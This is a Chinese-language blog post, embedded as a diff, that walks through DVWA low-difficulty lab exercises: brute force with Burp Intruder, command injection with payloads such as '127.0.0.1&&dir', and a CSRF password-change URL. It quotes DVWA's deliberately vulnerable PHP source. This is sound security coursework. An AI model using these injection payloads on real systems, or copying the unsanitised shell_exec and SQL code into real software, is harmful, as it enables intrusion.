@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>DVWA-low-wp | iHui</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1 背景这次作用网安老师要求我们把DVWA的题目做出来，啥也不说了，早做完早学到手，come on 2 phpstudy和DVWA的安装我这里参考了下面这篇文章来安装上面phpstudy和DVWA。 https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;160378.htm 注意事项  在D盘下找个地方安装phpstudy，但是安装目录不能有中文和空格，不然后面即使安装完成后Apache启动时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA-low-wp">
+<meta property="og:url" content="http://example.com/2019/10/28/DVWA-low-wp/index.html">
+<meta property="og:site_name" content="iHui">
+<meta property="og:description" content="1 背景这次作用网安老师要求我们把DVWA的题目做出来，啥也不说了，早做完早学到手，come on 2 phpstudy和DVWA的安装我这里参考了下面这篇文章来安装上面phpstudy和DVWA。 https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;160378.htm 注意事项  在D盘下找个地方安装phpstudy，但是安装目录不能有中文和空格，不然后面即使安装完成后Apache启动时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028202652110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028202729354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028202913735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019102820303774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203207234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203252186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203536411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203640235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203744779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203835811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028203946179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204059300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204123194.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204334437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204358156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204608698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204707615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204742481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028204827913.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205008785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205031601.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205116787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205211862.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205256296.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205401193.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191028205746809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101113047517.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101113340600.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101114615173.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101114805657.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101115316765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101120555209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191101120641970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015141158.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015318272.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015339924.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015434797.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015500363.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015544462.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015626622.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015710805.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015806793.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029015855508.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019102901594379.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020021127.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020126408.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020158300.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020235148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/201910290203452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019102902044241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020651582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029020727215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029021002348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029021051987.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029021132160.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191029021151289.png">
+<meta property="article:published_time" content="2019-10-28T12:20:43.000Z">
+<meta property="article:modified_time" content="2020-01-10T01:48:23.054Z">
+<meta property="article:author" content="iHui">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191028202652110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70">
+  
+    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">iHui</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-DVWA-low-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/28/DVWA-low-wp/" class="article-date">
+  <time class="dt-published" datetime="2019-10-28T12:20:43.000Z" itemprop="datePublished">2019-10-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/DVWA/">DVWA</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      DVWA-low-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>这次作用网安老师要求我们把DVWA的题目做出来，啥也不说了，早做完早学到手，come on</p>
+<h1 id="2-phpstudy和DVWA的安装"><a href="#2-phpstudy和DVWA的安装" class="headerlink" title="2 phpstudy和DVWA的安装"></a>2 phpstudy和DVWA的安装</h1><p>我这里参考了下面这篇文章来安装上面phpstudy和DVWA。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/160378.htm">https://www.jb51.net/article/160378.htm</a></p>
+<p>注意事项</p>
+<ol>
+<li>在D盘下找个地方安装phpstudy，但是安装目录不能有中文和空格，不然后面即使安装完成后Apache启动时会报错AH00526。</li>
+<li>在D盘中安装phpstudy中的WWW目录下解压DVWA，并修改WWW\DVWA-master\config下面的config.inc.php.dist文件，将其中数据库密码修改为root，文件后缀名改为.php。</li>
+</ol>
+<h1 id="3-题目及解题思路"><a href="#3-题目及解题思路" class="headerlink" title="3 题目及解题思路"></a>3 题目及解题思路</h1><h2 id="3-1-Brute-Force"><a href="#3-1-Brute-Force" class="headerlink" title="3.1 Brute Force"></a>3.1 Brute Force</h2><h3 id="3-1-1-源码如下"><a href="#3-1-1-源码如下" class="headerlink" title="3.1.1 源码如下"></a>3.1.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">    // Get username</span><br><span class="line">    $user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Get password</span><br><span class="line">    $pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    // Check the database</span><br><span class="line">    $query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">        // Get users details</span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">        // Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Login failed</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1-2-发现Username的那一项需要为admin，然后就将123作为输入的密码，同时打开专业版burpsuite进行抓包，然后点击Login，获得如下信息。"><a href="#3-1-2-发现Username的那一项需要为admin，然后就将123作为输入的密码，同时打开专业版burpsuite进行抓包，然后点击Login，获得如下信息。" class="headerlink" title="3.1.2 发现Username的那一项需要为admin，然后就将123作为输入的密码，同时打开专业版burpsuite进行抓包，然后点击Login，获得如下信息。"></a>3.1.2 发现Username的那一项需要为admin，然后就将123作为输入的密码，同时打开专业版burpsuite进行抓包，然后点击Login，获得如下信息。</h3><p><img src="https://img-blog.csdnimg.cn/20191028202652110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="抓包分析"></p>
+<h3 id="3-1-3-然后再发向Intruder，加载字典，利用sniper爆破即可得到密码"><a href="#3-1-3-然后再发向Intruder，加载字典，利用sniper爆破即可得到密码" class="headerlink" title="3.1.3 然后再发向Intruder，加载字典，利用sniper爆破即可得到密码"></a>3.1.3 然后再发向Intruder，加载字典，利用sniper爆破即可得到密码</h3><p><img src="https://img-blog.csdnimg.cn/20191028202729354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="修改password的参数"></p>
+<h3 id="3-1-4-用上面得到的密码登录"><a href="#3-1-4-用上面得到的密码登录" class="headerlink" title="3.1.4 用上面得到的密码登录"></a>3.1.4 用上面得到的密码登录</h3><p><img src="https://img-blog.csdnimg.cn/20191028202913735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="登录效果"></p>
+<h2 id="3-2-Command-Injection"><a href="#3-2-Command-Injection" class="headerlink" title="3.2 Command Injection"></a>3.2 Command Injection</h2><h3 id="3-2-1-源码如下"><a href="#3-2-1-源码如下" class="headerlink" title="3.2.1 源码如下"></a>3.2.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-2-典型的命令注入型错误，首先用-127-0-0-1-amp-amp-dir-来进行测试，可以发现所有的目录"><a href="#3-2-2-典型的命令注入型错误，首先用-127-0-0-1-amp-amp-dir-来进行测试，可以发现所有的目录" class="headerlink" title="3.2.2 典型的命令注入型错误，首先用  127.0.0.1&amp;&amp;dir 来进行测试，可以发现所有的目录"></a>3.2.2 典型的命令注入型错误，首先用  127.0.0.1&amp;&amp;dir 来进行测试，可以发现所有的目录</h3><p><img src="https://img-blog.csdnimg.cn/2019102820303774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="dir获取所有目录"></p>
+<h3 id="3-2-3-然后用-127-0-0-1-amp-amp-help-来进行测试，可以发现所有的命令提示"><a href="#3-2-3-然后用-127-0-0-1-amp-amp-help-来进行测试，可以发现所有的命令提示" class="headerlink" title="3.2.3 然后用 127.0.0.1&amp;&amp;help 来进行测试，可以发现所有的命令提示"></a>3.2.3 然后用 127.0.0.1&amp;&amp;help 来进行测试，可以发现所有的命令提示</h3><p><img src="https://img-blog.csdnimg.cn/20191028203207234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="获取帮助"></p>
+<h3 id="3-2-4-接着用-127-0-0-1-amp-amp-index-php-来查看当前主页面的php文件配置"><a href="#3-2-4-接着用-127-0-0-1-amp-amp-index-php-来查看当前主页面的php文件配置" class="headerlink" title="3.2.4 接着用 127.0.0.1&amp;&amp;index.php 来查看当前主页面的php文件配置"></a>3.2.4 接着用 127.0.0.1&amp;&amp;index.php 来查看当前主页面的php文件配置</h3><p><img src="https://img-blog.csdnimg.cn/20191028203252186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="查看index.php文件"></p>
+<h2 id="3-3-CSRF"><a href="#3-3-CSRF" class="headerlink" title="3.3 CSRF"></a>3.3 CSRF</h2><h3 id="3-3-1-源码如下"><a href="#3-3-1-源码如下" class="headerlink" title="3.3.1 源码如下"></a>3.3.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-2-利用Web应用程序在当前经过身份验证的Web应用程序上执行不需要的操作，下面是我输入两次123并用burpsuite抓包后的部分url"><a href="#3-3-2-利用Web应用程序在当前经过身份验证的Web应用程序上执行不需要的操作，下面是我输入两次123并用burpsuite抓包后的部分url" class="headerlink" title="3.3.2 利用Web应用程序在当前经过身份验证的Web应用程序上执行不需要的操作，下面是我输入两次123并用burpsuite抓包后的部分url"></a>3.3.2 利用Web应用程序在当前经过身份验证的Web应用程序上执行不需要的操作，下面是我输入两次123并用burpsuite抓包后的部分url</h3><p><img src="https://img-blog.csdnimg.cn/20191028203536411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="burpsuite抓取url"></p>
+<h3 id="3-3-3-然后在地址栏的url后面添加下面字符，密码就会被修改为ikun"><a href="#3-3-3-然后在地址栏的url后面添加下面字符，密码就会被修改为ikun" class="headerlink" title="3.3.3 然后在地址栏的url后面添加下面字符，密码就会被修改为ikun"></a>3.3.3 然后在地址栏的url后面添加下面字符，密码就会被修改为ikun</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password_new=ikun&amp;password_conf=ikun&amp;Change=Change#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028203640235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="利用url修改密码"></p>
